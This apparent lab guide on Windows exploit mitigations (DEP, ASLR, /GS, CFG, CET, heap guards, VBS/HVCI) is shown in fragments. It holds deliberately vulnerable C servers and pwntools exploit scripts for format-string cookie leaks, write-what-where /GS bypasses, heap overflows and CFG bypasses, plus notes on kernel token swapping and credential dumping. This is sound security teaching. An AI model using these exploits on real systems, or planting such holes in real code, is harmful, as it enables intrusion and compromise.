...
description: Use when researching Windows exploit mitigations such as ASLR, DEP/NX, CFG, CET, shadow stacks, SEHOP, heap guards, ACG, or bypass strategies.
---
...
â”‚ 63â”‚62-52â”‚51-Mâ”‚M-12â”‚11-9â”‚ 8 â”‚ 7 â”‚ 6 â”‚ 5 â”‚ 4 â”‚ 3 â”‚ 2 â”‚ 1 â”‚ 0 â”‚
â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤
â”‚NX â”‚Availâ”‚Rsv â”‚PFN â”‚Avl â”‚G  â”‚PATâ”‚D  â”‚A  â”‚PCDâ”‚PWTâ”‚U/Sâ”‚R/Wâ”‚P  â”‚
...
#                                                                                 â†‘ Code section     â†‘ Stack - no execute
```
...
Protect:           00000004  PAGE_READWRITE    # â† NO EXECUTE - DEP protected!
...
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ  # â† Executable but NOT writable
...
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE    # â† Stack is NEVER executable
Type:              00020000  MEM_PRIVATE
```
...
We use the `vulnerable_suite_win_mitigated.c` from the start of this lab (see Line ~450). The suite's **Option 1 (Stack Overflow)** triggers the `vuln_stack()` function which attempts to execute shellcode placed on the stackâ€”DEP should block this.
...
> The key observation is that `!vprot @rsp` shows `PAGE_READWRITE` without execute permissionâ€”DEP is working!
...
â”‚ Component          â”‚ Bits â”‚ Possible Values â”‚ Notes             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Executable (EXE)   â”‚  17  â”‚     131,072     â”‚ /HIGHENTROPYVA    â”‚
â”‚ DLLs               â”‚  19  â”‚     524,288     â”‚ Per-DLL random    â”‚
â”‚ Stack              â”‚  17  â”‚     131,072     â”‚ Per-thread        â”‚
â”‚ Heap               â”‚   5  â”‚          32     â”‚ Per-allocation    â”‚
â”‚ PEB/TEB            â”‚   8  â”‚         256     â”‚ Process/thread    â”‚
â”‚ Kernel (KASLR)     â”‚  24  â”‚  16,777,216     â”‚ At boot only      â”‚
...
â”‚ Component          â”‚ Bits â”‚ Possible Values â”‚ Notes             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Executable (EXE)   â”‚   8  â”‚         256     â”‚ Limited by VA     â”‚
â”‚ DLLs               â”‚   8  â”‚         256     â”‚ Brute-forceable   â”‚
â”‚ Stack              â”‚  14  â”‚      16,384     â”‚ Better than EXE   â”‚
â”‚ Heap               â”‚   5  â”‚          32     â”‚ Same as x64       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
...
void handle_client(SOCKET client_sock) {
    ...
    //
    // But /GS cannot reorder struct members (C standard Â§6.7.2.1 guarantees
...
def leak_stack_values(r):
    ...
    # 20 * (16 + 1) = 340 bytes â€” safely within response[2048].
    payload = b"%p." * 20
    r.send(payload)
...
def exploit_with_known_offset():
    ...
    log.info("already executed â€” the damage is done BEFORE /GS checks!")
    log.info("")
    log.info("To test CFG: run against vuln_server_cfg.exe instead.")
    log.info("NOTE: CFG is coarse-grained â€” dangerous_handler IS a valid function")
...
# Exploitation phase (auto-parsed â€” no manual update needed):
...
> NOT block this because the target (`exec_command`) is a valid function entry point â€” CFG
...
Addresses are auto-parsed from the binary's runtime output â€” no manual
...
def cfg_test():
    ...
    CFG maintains a bitmap of ALL valid function entry points. It checks:
      "Is the target address a valid function start?" â€” YES/NO.
    It does NOT check:
...
{out1.decode(errors='replace')}")
        if b"[DANGER]" in out1:
            log.success("CFG ALLOWED the call â€” target is a valid function entry!")
        elif b"[SAFE]" in out1:
...
{out2.decode(errors='replace')}")
        if b"[DANGER]" in out2:
            log.warning("Call went through â€” CFG didn't catch mid-function?")
    except:
        pass
    ...
    if exit2 in (0x80000003, 0xc0000409):
        log.success("CFG BLOCKED the call â€” target is NOT a valid function entry!")
        if exit2 == 0x80000003:
            log.info("  STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)")
    elif exit2 == 0xc0000005:
        log.success("Access Violation â€” mid-function jump crashed")
    else:
    ...
    log.info("=" * 60)
    log.info("CONCLUSION:")
    log.info("  CFG is COARSE-GRAINED â€” it checks if the target is ANY valid")
...
# Exploitation (address auto-parsed â€” no manual update needed):
...
#[*] TEST 1: Redirect to dangerous_handler (valid function entry)
#[+] CFG ALLOWED the call â€” target is a valid function entry!
#[*] Exit code: 0x0
#
#[*] TEST 2: Redirect to dangerous_handler+4 (mid-function, NOT in CFG bitmap)
#[+] CFG BLOCKED the call â€” target is NOT a valid function entry!
#[*]   STATUS_BREAKPOINT via __fastfail (CFG kill mechanism)
#[*] Exit code: 0x80000003
#
#[*] CONCLUSION:
#[*]   CFG is COARSE-GRAINED â€” it checks if the target is ANY valid
...
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler`   | **RCE**     | CFG allows â€” target is a valid function entry  |
| `func_ptr_overwrite_cfg.exe` | ON  | ON  | `dangerous_handler+4` | **Blocked** | CFG blocks â€” mid-function is not in CFG bitmap |

> [!WARNING]
> **CFG is coarse-grained!** It maintains a bitmap of valid function entry points and
> checks "is the target ANY valid function start?" â€” not "is this specific call site
...
> ever validated. This is a fundamental limitation of stack cookies â€” they're a **post-hoc**
...
>
> **CET**: Completely irrelevant here. No control flow is hijacked â€” the exception
...
â”‚   Local Variables   â”‚           â”‚                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”‚                     â”‚
â”‚   Saved RBP         â”‚           â”‚                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   Return Address    â”‚ --------> â”‚   Return Address    â”‚
...
- No user-mode recovery â€” kernel kills the process immediately
...
+ JOP (Jump-Oriented Programming) â€” doesn't use RET
+ COP (Call-Oriented Programming) â€” uses CALL, not RET
...
void handle_login(SOCKET client, char* data) {
    ...
    // VULNERABILITY: Format string leak â€” attacker-controlled format!
    ...
    // With username[64], only ~21 specifiers fit â€” not enough.
    // With raw data (~500 bytes), ~166 specifiers fit â€” reaches everything.
...
def leak_stack_values(num_pads):
    ...
    MSVCRT doesn't support positional %N$p â€” we must use sequential %p.
...
def identify_values(leaks):
    ...
    - Stack cookie (XOR'd with RBP â€” high entropy, not a valid address)
...
def exploit():
    ...
    log.info("=" * 50)
    log.info("Stack Cookie Bypass â€” Information Leak")
    log.info("=" * 50)
    ...
    if identified['code_ptrs']:
        ...
        log.warning("No code pointers leaked â€” try increasing num_pads")
...
// The stack cookie is NEVER corrupted â€” the write targets a GLOBAL pointer.
//
...
", offsetof(WriteRequest, target));
    ...
    // fread does NOT add \0 or stop at newline â€” reads exact binary data.
...
# Cookie is NEVER corrupted â€” fread reads exactly sizeof(struct) bytes
```
...
"""
exploits/sc_www.py
Write-What-Where Exploit â€” Bypasses /GS without corrupting the cookie!
...
cleanup_handler is enough â€” upper bytes remain correct.
...
{decoded}")
    ...
    #   index     @ +0x20  (4 bytes â€” not used when target is non-NULL)
    #   value     @ +0x24  (4 bytes â€” WHAT to write: low 32 bits of dangerous_action)
    #   target    @ +0x28  (8 bytes â€” WHERE to write: &cleanup_handler)
    #
    ...
    log.info(f"  [32..35]  index: 0 (unused â€” target is non-NULL)")
    ...
    # Send exactly 48 bytes â€” fread reads sizeof(req) = 48, no 
 needed
    p.send(payload)
...
{decoded}")
        ...
        if "PWNED" in decoded or "dangerous" in decoded.lower():
            ...
            log.success("/GS cookie was NEVER corrupted â€” bypass complete")
        elif "Safe cleanup" in decoded:
            log.failure("cleanup_handler was NOT overwritten")
            log.failure("Check address parsing â€” compare with startup output")
    except:
        pass
    ...
    if p.returncode is not None:
        exit_code = p.returncode & 0xFFFFFFFF
        if exit_code == 0:
            log.success(f"Clean exit (0x0) â€” cookie was never corrupted")
...
#[*]   [32..35]  index: 0 (unused â€” target is non-NULL)
...
#[+] /GS cookie was NEVER corrupted â€” bypass complete
#[+] Clean exit (0x0) â€” cookie was never corrupted
```

### Practical Exercise

#### Task 1: Format String Leak â€” Cookie and ASLR Recovery
...
3. **Leak stack values** via format string (MSVCRT: sequential `%p`, bare hex, no `%N$p`):
   ...
   ```bash
   # 80 specifiers Ã— ~17 chars each = ~1360 chars, but _vsnprintf buffer is 512.
   # Result: ~30 values leaked (512/17 â‰ˆ 30). This is realistic â€” real leaks
...
5. **Verify with WinDbg** â€” cross-check leaked values against actual stack:
   ...
   g
   # Server starts â€” connect with the format string payload from another terminal
   ...
   # IMPORTANT: poi() dereferences the symbol â€” without it, you get the ADDRESS
...
8. **On CET systems**: The cookie leak is still valuable for understanding the target, but use struct-based attacks (Techniques 1-4) for exploitation â€” CET shadow stack blocks ROP

#### Task 2: CFG Coarse-Grained Bypass â€” Prove It Empirically
...
2. **Run all three standard exploits** â€” all should pop calc:
...
def get_module_base(handle):
    ...
    Uses EnumProcessModulesEx â€” the first module is always the EXE itself.
    """
    ...
    # hMods[0] returns a Python int from c_void_p â€” use it directly for math,
...
[*] Cookie Analysis:")
    ...
    if (cookie >> 48) == 0:
        print(f"  [!] WARNING: Upper 16 bits are zero â€” reduced entropy")
    ...
    print(f"
[*] Memory around cookie (Â±32 bytes):")
...
#### Task 4: Write-What-Where Lab â€” Global Function Pointer Attack
...
1. **Compile the www_vuln.c** (with `/GS` enabled â€” it won't help):
...
3. **Verify cookie was untouched** â€” the exit code is `0x0` (clean), not `0xc0000409`.
...
1. **Stack cookies are bypassable through multiple vectors**: Information leaks (format string -> cookie recovery), struct-based function pointer overwrites (C standard Â§6.7.2.1 guarantees member order, `/GS` does NOT reorder struct internals), exception-based bypasses (cookie checked at `ret`, not at exception), and Write-What-Where primitives (target globals, never touch the cookie)
2. **`/GS` variable reordering has a critical blind spot**: While `/GS` moves arrays to higher stack addresses (next to the cookie), it cannot reorder **struct members** â€” the C standard requires preserved declaration order. Placing a buffer and function pointer in the same struct creates an exploitable layout that `/GS` cannot fix
3. **CET shadow stacks completely block return address hijacking**: Not "makes it harder" â€” **impossible**. The shadow stack is a hardware-protected copy of return addresses. Every `RET` compares both copies; mismatch -> `#CP` exception -> kernel kills the process via `__fastfail` -> exit code `0x80000003` (STATUS_BREAKPOINT). No user-mode recovery. This is why data-only and indirect `CALL` attacks are the modern approach
4. **CFG is coarse-grained â€” proven empirically**: MSVC CFG (`/guard:cf`) checks "is the target ANY valid function entry point?" â€” NOT "should THIS call site call THAT function." We proved this: redirecting `safe_handler` -> `dangerous_handler` passes CFG because `dangerous_handler` is a valid function. Only `dangerous_handler+4` (mid-function) is blocked with `0x80000003`. Fine-grained CFI (Clang `-fsanitize=cfi`) validates type signatures and would block this
5. **Data-only attacks bypass /GS + CET + coarse-grained CFG simultaneously**: Corrupting a security flag (`is_admin` in Technique 4), a function pointer in a struct (Techniques 1-3), or a global function pointer via Write-What-Where (Scenario 2) â€” none of these trigger any of the three mitigations
6. **Exception-based timing window**: `/GS` cookies are validated at function **return** (`__security_check_cookie` in the epilogue). If an exception fires between the overflow and the return, the `__except` handler reads already-corrupted data before the cookie is ever checked. On x64, this is NOT an SEH chain overwrite (impossible â€” table-based `.pdata`), but a data-corruption-before-check attack
7. **MSVCRT format strings differ from glibc in exploit-critical ways**:
   - `%p` prints bare hex (`000000000014FA48`) â€” no `0x` prefix
   - Positional `%N$x` is NOT supported â€” must use sequential `%p` and count offsets
   - `printf("%s", NULL)` prints `(null)` instead of crashing â€” cannot trigger exceptions this way
   - `_vsnprintf` buffer size limits how many values you can leak (512 bytes / 17 chars per `%p.` â‰ˆ 30 values)
...
9. **Defense in depth is essential â€” no single mitigation is sufficient**:
...
1. **Can you overflow past the stack cookie without corrupting it?**
   Yes â€” three proven methods from this lab:
...
> NOT blocked by CFGâ€”that's what CET Shadow Stack is for.
...
ALLOWS calls to valid function entries â€” even if the function was never
...
// â€” NOT "should this virtual call dispatch to that function?"
...
");
    printf("[!] This proves CFG is coarse-grained â€” malicious_code
");
...
");
        fflush(stdout);
        shape->draw();  // CFG ALLOWS â€” malicious_code is a valid function!
...
");
        fflush(stdout);
        shape->draw();  // CFG BLOCKS â€” 0xDEADDEAD not in bitmap!
...
# 1. Without CFG â€” both tests "work" (no validation)
...
> ANY valid function?" â€” not "should THIS vtable dispatch THAT function."
...
#                  6D Guard CF function count        â† 109 functions protected
#            10014500 Guard Flags                    â† CF Instrumented (bit 0x10000000)
...
#    0000000000000000 Guard CF function table        â† No table (null)
#                   0 Guard CF function count        â† Zero functions protected
#            00000100 Guard Flags                    â† NOT instrumented (no 0x10000000)
...
**Exercise: CFG Heap Function Pointer Overwrite â€” Coarse vs Fine Grained**:
...
");
    printf("[!] CFG allowed this â€” malicious_code is a valid function entry.
");
    fflush(stdout);
}
...
# [!] CFG allowed this â€” malicious_code is a valid function entry.
# [*] Call returned.
# Exit code: 0x0
...
â”‚ 0x00000000`00000000    â”‚--->â”‚ Bit 0        â”‚
â”‚ 0x00000000`00000010    â”‚--->â”‚ Bit 1        â”‚
â”‚ 0x00000000`00000020    â”‚--->â”‚ Bit 2        â”‚
â”‚ ...                    â”‚    â”‚ ...          â”‚
â”‚ 0x00007FFF`FFFFFFFF    â”‚--->â”‚ Bit N        â”‚
...
void __fastcall __guard_check_icall_fptr(void *target) {
    // Get bitmap base (simplified â€” actual source is ntdll internal)
...
# Kernel kills the process immediately â€” no user-mode handler runs

# Process exit code: 0x80000003 (STATUS_BREAKPOINT)
# This is the ACTUAL exit code you see from GetExitCodeProcess()
# NOTE: NOT 0xC0000409 â€” that's the old-style /GS cookie failure.
...
**Testing CFG â€” Valid vs Invalid Targets**:
...
â”‚ Local vars â”‚       â”‚            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Saved RBP  â”‚       â”‚ Return addrâ”‚ <- Copy of return address
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚ Return addrâ”‚ <- User-accessible   Hardware-protected
...
â”‚ Return addr (main) â”‚           â”‚ Return addr (main) â”‚ â† Token
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Saved RBP          â”‚           â”‚ Return addr (func1)â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Local vars         â”‚           â”‚ Return addr (func2)â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Return addr (func1)â”‚           â”‚         ...        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â”‚ ...                â”‚           ^
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜           SSP (Shadow Stack Pointer)
^
RSP
...
3. If mismatch:
   ...
   - NOTE: The exception code (0xC0000407) and process exit code
     (0x80000003) are DIFFERENT â€” same mechanism as CFG failures.
...
```c
// xfg_concept.c â€” Type Confusion Demonstration (CFG vs XFG)
...
", (void*)noarg_handler);
    ...
    if (test_mode == 1) {
        // TEST 1: Correct type â€” always works
...
");
        ...
        // TEST 2: Type confusion â€” CFG allows, XFG would block
...
");
        ...
        printf("[+] Call succeeded â€” CFG is coarse-grained!
");
        printf("[!] str_handler received garbage (42 instead of char*)
");
    }
    else if (test_mode == 3) {
        // TEST 3: Invalid address â€” CFG blocks
        printf("[*] TEST 3: Invalid address (0xDEADBEEF)
");
        printf("[!] Not a valid function entry â€” CFG will block
");
        fflush(stdout);
...
#[+] Call succeeded â€” CFG is coarse-grained!
...
#[!] Not a valid function entry â€” CFG will block
#[*] Calling through IntHandler pointer...
...
```c
// cfg_analysis.c â€” Task 1: Prove CFG's coarse-grained limitation
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
...
",
    ...
    if (argc > 1 && argv[1][0] == '1') {
        // Redirect to another valid function â€” CFG ALLOWS
        printf("[*] Redirecting function pointer to pwn()...
");
        op = pwn;
    } else if (argc > 1 && argv[1][0] == '2') {
        // Redirect to shellcode address â€” CFG BLOCKS
...
> tampering â€” there is no "allowed" case. Any ROP chain or return address overwrite
...
1. **CFG is coarse-grained**: It checks "is the target ANY valid function entry?" â€” not
...
2. **CET completely blocks ROP**: Shadow stacks are hardware-enforced â€” any return address
...
4. **XFG improves CFG with type hashes**: XFG validates that the target function's
   ...
   However, XFG is OS-managed â€” there is no public `/guard:xfg` compiler flag.
...
8. **IBT (Indirect Branch Tracking)** requires `ENDBR64` at branch targets â€” backward
   compatible (it's a NOP on older CPUs), but provides forward-edge protection on CET
   hardware.
9. **Kernel shadow stacks** extend CET to ring 0 via VBS/HVCI â€” even kernel ROP chains
...
1. **Why does CFG allow any valid function, not just compatible types?**
   ...
   > addresses are valid function entries â€” not which functions are valid for a
...
2. **How does CET shadow stack affect legitimate exception handling?**
   ...
   > This is handled transparently by the CRT â€” application code doesn't need changes.
...
3. **What attack surfaces remain even with CFG + CET + XFG?**
   ...
   > SQL query strings, or configuration data â€” none of which involve function pointers
...
4. **Can CFI be perfect, or will bypasses always exist?**
   ...
   > indirect call at every point in execution â€” essentially a complete program analysis.
...
");
    ...
    // Try to free chunk2 â€” heap validates encoded metadata
...
# Run normally â€” may or may not crash depending on heap layout
...
# Exit code: 0xC0000005 (STATUS_ACCESS_VIOLATION) â€” guard page hit
...
- Transparent to application code (no source changes needed â€” it hooks the allocator)
...
# Run WITHOUT AppVerifier â€” UAF likely succeeds silently!
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Output: [!] UAF read: 'Ã‡Ã¹Î±â•¢Z'  (garbage/stale data!)
# Output: [!] UAF write succeeded (no AppVerifier)
# Exit code: 0x0 â€” no crash, no detection!

# Enable AppVerifier â€” UAF caught immediately
appverif -enable Heaps -for bin\heap_uaf.exe
.\bin\heap_uaf.exe
# Output: [*] Allocated: ..., content: 'Hello from allocated memory'
# Output: [*] Freed ...
# Program terminates silently â€” AppVerifier caught the UAF!
...
â”‚ Admin/User Token       â”‚         â”‚ AppContainer Token     â”‚
â”‚ - Full user rights     â”‚         â”‚ - Restricted rights    â”‚
â”‚ - Access to profile    â”‚         â”‚ - Limited capabilities â”‚
â”‚ - Network access       â”‚         â”‚ - Isolated namespace   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                                    â”‚
        â–¼                                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ File System            â”‚         â”‚ Virtualized FS         â”‚
â”‚ - C:\Users\...         â”‚         â”‚ - AppData\Local\       â”‚
â”‚ - Any location         â”‚         â”‚   Packages\<AppName>   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                                    â”‚
        â–¼                                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Registry               â”‚         â”‚ Virtualized Registry   â”‚
â”‚ - HKCU, HKLM           â”‚         â”‚ - Package-specific     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
...
", saved_addr);
    ...
    // Spray ImageData on IMAGE heap â€” DIFFERENT heap!
...
To fully understand heap protections, we need a network-facing vulnerable server and pwntools scripts that exploit it â€” showing how mitigations block real attacks.

##### Vulnerable Heap Server

```c
// vuln_heap_server.c â€” Network server with heap vulnerabilities
...
");
    ...
    // BUG: No bounds check on size â€” allows heap overflow!
...
");
    ...
    // BUG: Pointer NOT nulled â€” UAF possible!
...
");
    ...
    // Calls via function pointer â€” CFG would validate this
...
# Without mitigations (baseline â€” exploitable)
...
#!/usr/bin/env python3
"""
heap_overflow_exploit.py â€” Pwntools exploit for vuln_heap_server
...
def write_note(io, idx, size, data):
    ...
    try:
        ...
        log.critical("Server crashed during write â€” Page Heap detected overflow!")
...
def delete(io, idx):
    """Delete (free) a note â€” does NOT null the pointer (UAF)."""
...
def use(io, idx):
    ...
    try:
        ...
        log.warning("Server crashed (connection closed) â€” mitigation triggered!")
        return None
...
def exploit():
    ...
    if addr0 and addr1:
        ...
        log.warning("Could not parse note addresses â€” proceeding with blind overflow")
    ...
    if orig_func:
        ...
        log.warning("Could not leak function pointer â€” check server response format")
    ...
    if addr0 and addr1:
        ...
        if gap > 1024:
            log.warning(f"Large gap detected ({gap} bytes) â€” Page Heap likely enabled!")
    ...
    if corrupted_func:
        if corrupted_func == 0x4141414141414141:
            ...
            log.success("Heap overflow succeeded â€” NO protection detected!")
        else:
    ...
    result = use(io, 1)
    if result is None:
        log.success("Server crashed â€” mitigation likely triggered")
        ...
        log.warning("Server survived â€” function pointer may not have been corrupted")
...
```bash
# 1. Test without mitigations (baseline â€” should succeed)
...
#   [+] Heap overflow succeeded â€” NO protection detected!
...
#   [!] Large gap detected â€” Page Heap likely enabled!
#   [!] Server crashed during write â€” Page Heap detected overflow!
...
- **Without mitigations**: Overflow succeeds â†’ crash at controlled address
...
2. **UAF bugs are silent without AppVerifier**: freed memory often still contains valid
   ...
   `0xF0F0F0F0` and places guard pages â€” making UAF instantly visible.
...
6. **Segment Heap** (Windows 10+ default for modern apps) adds allocation order
   randomization and guard pages between segments â€” making heap spraying harder.
7. **MemGC** delays memory reuse until all live pointers are gone â€” but has 10-15%
...
9. **Always use `fflush(stdout)` before operations that may crash** â€” otherwise printf
...
2. **Why doesn't Windows use full garbage collection?**
   ...
   > GC requires tracking ALL references to every allocation â€” impossible in C/C++
...
â”‚         Hardware (CPU)             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚    Hyper-V Hypervisor (Ring -1)    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Normal World   â”‚  Secure World    â”‚
â”‚   (VTL 0)       â”‚    (VTL 1)       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Windows Kernel  â”‚ Secure Kernel    â”‚
â”‚ Applications    â”‚ Secure Services  â”‚
â”‚ Drivers         â”‚ - Credential     â”‚
â”‚                 â”‚   Guard          â”‚
â”‚                 â”‚ - HVCI           â”‚
â”‚                 â”‚ - Device Guard   â”‚
...
# Output:
# * Username: admin
# * NTLM: (null)  â† Credential Guard blocked access!
```
...
- Not a blanket protection â€” only data explicitly registered is guarded
...
> token-swapping attacks. It does NOT â€” unless a specific driver opts in.
...
4. Overwrite process token (NOT protected by KDP â€” Token is not opted in)
...
This is a DATA-ONLY attack â€” same category proven effective in Day 2
```
...
2004: DEP introduced (XP SP2)
      â†“ Attackers develop ROP

2007: ASLR introduced (Vista)
      â†“ Attackers use info leaks

2015: CFG introduced (Win 8.1 Update 3)
      â†“ Attackers abuse valid targets

2018: CET announced (Hardware support later)
      â†“ Attackers pivot to data-only attacks

2020: VBS/HVCI mainstream (Win 10 2004)
      â†“ Attackers focus on logic bugs, signed drivers
...
â”‚ Shellcode       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”‚ Corrupted ptr   â”‚
â”‚ at 0x41410000   â”‚  JUMP   â”‚ -> 0x41410000   â”‚
â”‚ (Ring 3 memory) â”‚         â”‚                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â–²
     â”‚
   SMEP BLOCKS THIS!
...
â”‚ User Space Mappings                     â”‚  â† User code can access
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Kernel Space Mappings                   â”‚  â† Visible but protected
â”‚ (ntoskrnl, drivers, kernel data)        â”‚     (Meltdown leaks this!)
...
â”‚ User Space Mappings        â”‚    â”‚ User Space Mappings             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Minimal Kernel (trampoline)â”‚    â”‚ Full Kernel Mappings            â”‚
â”‚ Only entry/exit code       â”‚    â”‚ All drivers, data, etc.         â”‚
...
â”‚ Process bitmap   â”‚  â”‚ System-wide bitmap       â”‚
â”‚ Per-process      â”‚  â”‚ Loaded at boot           â”‚
â”‚ User DLLs only   â”‚  â”‚ All drivers validated    â”‚
â”‚ Software check   â”‚  â”‚ HVCI enforced            â”‚
...
#!/usr/bin/env python3
"""
vbs_hvci_probe.py â€” Probe VBS and HVCI status via WMI and registry
...
If HVCI is on, kernel shellcode attacks are futile â€” pivot to data-only.
If Credential Guard is on, mimikatz credential dumping fails â€” pivot to
...
" + "=" * 65)
    ...
    if rc != 0 or not output:
        print("  [!] Could not query WMI â€” need Administrator privileges")
        return {}
...
#!/usr/bin/env python3
"""
hvci_driver_test.py â€” Test HVCI enforcement against driver loading attempts
...
def create_dummy_driver(path):
    ...
    This is NOT a real driver â€” it will fail signature checks.
    """
...
" + "=" * 60)
    ...
    if rc != 0:
        print(f"  [!] Failed to create service â€” need Administrator")
...
" + "=" * 60)
        ...
